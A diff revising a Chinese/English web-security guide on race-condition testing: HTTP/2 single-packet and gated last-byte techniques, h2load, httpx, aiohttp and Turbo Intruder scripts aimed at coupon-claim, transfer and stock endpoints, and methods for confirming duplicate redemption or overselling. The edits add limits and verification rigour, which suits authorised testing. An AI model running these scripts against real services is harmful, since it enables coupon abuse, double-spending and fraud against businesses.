@@ -168,9 +168,11 @@ threads = [threading.Thread(target=submit) for _ in range(10)]
 
 ## 三、测试工具与方法
 
-### 3.1 HTTP/2 单包攻击（Single Packet Attack）
+### 3.1 HTTP/2 并发与单包攻击（Single Packet Attack）
 
-**原理**: HTTP/2 多路复用允许在一个 TCP 包内发送多个请求，消除网络抖动，所有请求几乎同时到达服务器。
+**前提**：只用受控、可恢复的业务对象，记录初始余额/库存/领取次数，按请求预算从小批次开始。需要串行对照时使用等价的新对象或已核验复位的状态；不先消费竞态对象。结果按第四节核验，错误或未复现都不等于无竞态。
+
+**原理**：HTTP/2 多路复用支持并发流；真正的单包方法会先挂起各流，再集中释放完成请求所需的尾部。普通 `gather`、一个连接或 Nagle 都不保证单包/同时到达。下面 h2load/httpx 仅作并发实验；单包需支持 gate 的发送器及实际协议/时序证据。
 
 #### h2load 用法
 
@@ -179,18 +181,18 @@ threads = [threading.Thread(target=submit) for _ in range(10)]
 # Ubuntu: apt install nghttp2-client
 # macOS: brew install nghttp2
 
-# 发送50个并发请求，使用1个连接，每个连接最多50个流
+# coupon.json 是本地请求体文件；先按本次预算调整请求数
 h2load -n 50 -c 1 -m 50 \
   -H "Authorization: Bearer TOKEN" \
-  -d '{"couponId":"NEWUSER100"}' \
+  -d coupon.json \
   -H "Content-Type: application/json" \
   https://target.com/api/coupon/claim
 
 # 参数说明:
 # -n: 总请求数
-# -c: 并发连接数（设为1确保单包）
+# -c: 并发连接数（1 个连接不保证单包）
 # -m: 每个连接的最大并发流数
-# -d: POST 数据
+# -d: POST 数据文件路径，不是内联 JSON
 # -H: 请求头
 ```
 
@@ -200,8 +202,8 @@ h2load -n 50 -c 1 -m 50 \
 import httpx
 import asyncio
 
-async def single_packet_attack():
-    """HTTP/2 单包攻击"""
+async def http2_concurrent_test():
+    """普通 HTTP/2 并发，不保证单包"""
     url = "https://target.com/api/coupon/claim"
     headers = {
         "Authorization": "Bearer TOKEN",
@@ -209,9 +211,9 @@ async def single_packet_attack():
     }
     data = {"couponId": "NEWUSER100"}
     
-    # 使用 HTTP/2
+    # 允许协商 HTTP/2；实际版本必须从响应核对
     async with httpx.AsyncClient(http2=True) as client:
-        # 在同一连接上并发发送请求
+        # 排队并发请求；不保证连接数、单包或服务端到达顺序
         tasks = [
             client.post(url, headers=headers, json=data)
             for _ in range(50)
@@ -219,9 +221,9 @@ async def single_packet_attack():
         responses = await asyncio.gather(*tasks)
         
         for i, resp in enumerate(responses):
-            print(f"请求 {i+1}: {resp.status_code} - {resp.text}")
+            print(f"请求 {i+1}: {resp.http_version} {resp.status_code} - {resp.text}")
 
-asyncio.run(single_packet_attack())
+asyncio.run(http2_concurrent_test())
 ```
 
 ### 3.2 Turbo Intruder（Burp 插件）
@@ -229,17 +231,19 @@ asyncio.run(single_packet_attack())
 ```python
 # Burp → Extender → BApp Store → Turbo Intruder
 
-# 脚本示例（在 Turbo Intruder 中使用）
+# HTTP/1.1 多连接末字节 gate；不是 HTTP/2 单包
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
-                          concurrentConnections=1,
-                          requestsPerConnection=50,
-                          pipeline=False)
+                          concurrentConnections=10,
+                          requestsPerConnection=1,
+                          pipeline=False,
+                          engine=Engine.THREADED,
+                          maxRetriesPerRequest=0)
     
-    for i in range(50):
-        engine.queue(target.req)
+    for i in range(10):
+        engine.queue(target.req, gate='race1')
     
-    engine.start()
+    engine.openGate('race1')
 
 def handleResponse(req, interesting):
     table.add(req)
@@ -252,48 +256,51 @@ import asyncio
 import aiohttp
 import time
 
-async def race_condition_test(url, headers, data, count=50):
-    """通用竞态条件测试"""
-    
+async def race_condition_test(url, headers, data, count=2):
+    """有界 HTTP/1.1 并发；只返回观察，不裁决漏洞。"""
+    if not 1 <= count <= 50:
+        raise ValueError("count must be between 1 and 50 for this batch")
+    gate = asyncio.Event()
+
     async def send_request(session, index):
-        start = time.time()
-        async with session.post(url, headers=headers, json=data) as resp:
-            elapsed = time.time() - start
-            result = await resp.json()
-            return {
-                "index": index,
-                "status": resp.status,
-                "elapsed": elapsed,
-                "result": result
-            }
-    
-    # 创建连接池，复用连接
-    connector = aiohttp.TCPConnector(limit=1, limit_per_host=1)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        # 预热连接
-        await session.post(url, headers=headers, json=data)
-        
-        # 并发发送
-        tasks = [send_request(session, i) for i in range(count)]
-        results = await asyncio.gather(*tasks)
-        
-        return results
+        await gate.wait()
+        start = time.perf_counter()
+        try:
+            async with session.post(url, headers=headers, json=data,
+                                    allow_redirects=False) as resp:
+                body = await resp.read()
+                return {"index": index, "status": resp.status, "body": body,
+                        "elapsed": time.perf_counter() - start}
+        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
+            return {"index": index, "error": repr(exc),
+                    "elapsed": time.perf_counter() - start}
+
+    # H1 单连接会排队；每个待发请求有连接槽位，禁止用业务 POST 预热。
+    connector = aiohttp.TCPConnector(limit=count, limit_per_host=count)
+    timeout = aiohttp.ClientTimeout(total=10)
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        tasks = [asyncio.create_task(send_request(session, i)) for i in range(count)]
+        await asyncio.sleep(0)
+        gate.set()
+        return await asyncio.gather(*tasks)
 
 # 使用示例
 url = "https://target.com/api/coupon/claim"
 headers = {"Authorization": "Bearer TOKEN"}
 data = {"couponId": "NEWUSER100"}
 
-results = asyncio.run(race_condition_test(url, headers, data, 50))
+results = asyncio.run(race_condition_test(url, headers, data, count=2))
 
-# 分析结果
-success_count = sum(1 for r in results if r['status'] == 200)
-print(f"成功请求数: {success_count}/50")
+# HTTP 状态只统计响应；传输失败保留为未知，不自动重试业务写入。
+print(f"收到响应: {sum('status' in r for r in results)}/{len(results)}")
+print(f"传输未完成: {sum('error' in r for r in results)}")
 
-# 检查响应时间分布（越接近说明并发度越高）
+# 耗时相近不能证明请求重叠；需服务端时间线或受控接收端观察。
 times = [r['elapsed'] for r in results]
 print(f"最快: {min(times):.3f}s, 最慢: {max(times):.3f}s, 平均: {sum(times)/len(times):.3f}s")
 ```
+
+此 gate 同时放行客户端协程，连接握手仍可能错峰。需要预热时仅用已确认无副作用的请求或握手，不能调用领取/扣款口，也不能用一次读请求冒称所有连接已预热。正式执行前记录 attempt/claim，完整原件与最终读回按 `docs/evidence-runners.md#native-http-execution` 捕获登记。
 
 ### 3.4 curl 并发
 
@@ -321,6 +328,8 @@ seq 1 50 | parallel -j 50 \
 
 ### 如何确认竞态条件成功
 
+先用串行对照确认业务不变量及正常幂等语义，再对等价初态做并发。只比较本批受控对象，等待异步任务收敛，排除其他流量、退款/取消和重复返回同一交易 ID。HTTP 200、`code=0`、快慢差只算响应信号；须有独立交易/记录及最终净变化支持，初态或最终状态缺失就保留未验证。
+
 #### 4.1 余额/积分变化
 
 ```python
@@ -328,14 +337,14 @@ seq 1 50 | parallel -j 50 \
 before = get_balance()
 
 # 执行竞态测试
-race_condition_test(...)
+asyncio.run(race_condition_test(url, headers, data, count=2))
 
 # 测试后检查余额
 after = get_balance()
 
-# 判断
-if before - after > expected_deduction:
-    print("竞态条件成功: 扣款异常")
+# expected_deduction 来自本批唯一已提交交易及业务规则，不是成功响应数
+if before - after != expected_deduction:
+    print("余额净变化不符，核对交易账本及串行对照后判断竞态")
 ```
 
 #### 4.2 重复记录
@@ -352,29 +361,35 @@ HAVING count > 1;
 #### 4.3 库存异常
 
 ```python
-# 检查订单数是否超过库存
+# 隔离测试库存：记录初始可售量和初始订单 ID；下列 getter 需适配业务
+stock_before = get_stock(goods_id="LIMITED_ITEM")
+before_ids = {o['id'] for o in get_orders(goods_id="LIMITED_ITEM")}
+asyncio.run(race_condition_test(url, headers, data, count=2))
+# 等订单/库存收敛后，按唯一 ID 排除旧订单、幂等回包和未占库存的失败/取消单
 orders = get_orders(goods_id="LIMITED_ITEM")
-stock = get_stock(goods_id="LIMITED_ITEM")
+new_orders = {o['id']: o for o in orders
+              if o['id'] not in before_ids and o['status'] == 'committed'}
+committed_quantity = sum(o['quantity'] for o in new_orders.values())
+stock_after = get_stock(goods_id="LIMITED_ITEM")
 
-if len(orders) > stock:
-    print(f"库存超卖: 库存{stock}，订单{len(orders)}")
+if committed_quantity > stock_before:
+    print("新提交数量超过初始可售库存，结合对照确认超卖")
+elif stock_before - stock_after != committed_quantity:
+    print("库存与提交数量不一致，排除补货/退款/其他流量后再判断")
 ```
 
 #### 4.4 响应内容分析
 
 ```python
-# 分析所有响应
-results = race_condition_test(...)
-
-success_responses = [r for r in results if r['status'] == 200]
-print(f"成功响应数: {len(success_responses)}")
-
-# 检查响应中的业务状态码
-business_success = [r for r in success_responses 
-                   if r['result'].get('code') == 0]
-print(f"业务成功数: {len(business_success)}")
-
-# 如果业务成功数 > 1（对于一次性资源）→ 竞态条件存在
+# 一次性领取：先保存该受控用户/券的原记录，执行后从服务端重新查询
+before_ids = {r['id'] for r in get_claims(user_id="TEST_USER", coupon_id="TEST_COUPON")}
+results = asyncio.run(race_condition_test(url, headers, data, count=2))
+after_ids = {r['id'] for r in get_claims(user_id="TEST_USER", coupon_id="TEST_COUPON")}
+new_claims = after_ids - before_ids
+print(f"HTTP 200 响应数: {sum(r.get('status') == 200 for r in results)}")
+print(f"新增独立领取记录数: {len(new_claims)}")
+# 多个 200 返回同一领取 ID 且最终只领一次，是幂等结果。
+# 新增记录仍需核验有效额度/权益净增加，并与串行对照比较。
 ```
 
 ---
@@ -425,7 +440,7 @@ async def coupon_reuse_attack():
         results = await asyncio.gather(*tasks)
         
         success = sum(1 for r in results if r.status == 200)
-        print(f"成功使用优惠券 {success} 次")
+        print(f"HTTP 200 响应 {success} 次；实际用券次数按第四节读回核验")
 ```
 
 ### 5.3 签到/积分场景
@@ -675,7 +690,7 @@ Client N: [headers + body - 1 byte] ----hold----+
 
 ## 4. HTTP/2 SINGLE-PACKET ATTACK
 
-**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.
+**Idea**: Prepare incomplete HTTP/2 streams, then release their completion bytes together using a sender that implements this technique. Multiplexing alone does not provide that gate; confirm the actual negotiated protocol and release timing. Server scheduling may still serialize application work.
 
 **Burp Repeater (modern workflows)**:
 
@@ -826,19 +841,18 @@ Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ 
 
 ## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS
 
-### 9.1 TCP Nagle Algorithm & Frame Coalescing
+### 9.1 Completion Gates & Frame Coalescing
 
-TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).
+Hold back the bytes that complete each prepared HTTP/2 request, then release them as one bounded batch. Nagle, a single `sendall`, or disabling `TCP_NODELAY` cannot guarantee one TCP segment: TLS records, MSS, congestion and offload affect packetization. Use the sender's gate and wire/server observations; do not infer synchronization from the number of connections.
 
 ```text
-Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
-                            ↓ TCP Nagle coalescing ↓
-TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
+Prepare streams:     [Stream 1 partial] [Stream 3 partial] [Stream 5 partial]
+                            ↓ release completion gate ↓
+Final byte/frame batch: [Stream 1 end | Stream 3 end | Stream 5 end]
 ```
 
-- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
-- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
-- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization
+- A library supporting only parallel requests is useful for a basic race, but is not a single-packet sender.
+- Fit the completion batch to the observed transport; there is no universal requests-per-packet limit.
 
 ### 9.2 Server-Side Request Queue Processing
 
@@ -846,25 +860,25 @@ TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packe
 NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch
 
   ┌─ Stream 1 → worker thread A ─┐
-  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
+  ├─ Stream 3 → worker thread B ─┤  scheduling is implementation-dependent
   └─ Stream 5 → worker thread C ─┘
 ```
 
-1. Single `recv()` syscall returns the entire segment
-2. HTTP/2 frame parser demultiplexes streams from same segment
-3. Dispatcher fans out to application worker pool
+1. TCP provides a byte stream; `recv()` boundaries do not preserve packet boundaries.
+2. The HTTP/2 parser demultiplexes frames as bytes become available.
+3. Session locks, worker limits or application queues may still serialize requests.
 
-First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).
+Measure request overlap at the receiver when possible; client latency or stream numbering does not establish the server's race window.
 
 ### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison
 
 | Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
 |--------|---------------------|-------------------|
 | Connections needed | 1 | N (one per request) |
-| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
-| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
-| Server dispatch gap | < 100 μs | 1–5 ms typical |
-| Practical limit | ~20–30 requests per MTU | Limited by connection setup |
+| Wire synchronization | Gated completion batch; verify packetization | Completion bytes released across connections |
+| Network jitter impact | Reduced when completion bytes arrive together | Each connection has independent RTT |
+| Server dispatch gap | Measure; application may serialize | Measure; application may serialize |
+| Practical limit | Frame size, MSS and negotiated stream limit | Connection limits and setup |
 
 ### 9.4 Practical Execution with h2spacex
 
@@ -1020,13 +1034,13 @@ Instead of N copies of the same request, send requests to **different endpoints*
 
 ```text
 Single TCP segment:
-  Stream 1: GET  /api/balance       ← probe pre-state
+  Stream 1: GET  /api/balance       ← in-burst observation, not a baseline
   Stream 3: POST /api/transfer      ← mutate
   Stream 5: POST /api/transfer      ← mutate (duplicate)
-  Stream 7: GET  /api/balance       ← probe post-state
+  Stream 7: GET  /api/balance       ← in-burst observation, not final state
 ```
 
-Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.
+Stream IDs do not establish application execution order: either GET may run before or after either POST. Read the baseline before releasing the burst and the final balance after all writes settle. A difference between the two in-burst GETs alone proves neither a race nor an invariant violation; correlate unique committed transactions with the final state and a serial control.
 
 ### Pattern 2: Cross-resource race
 
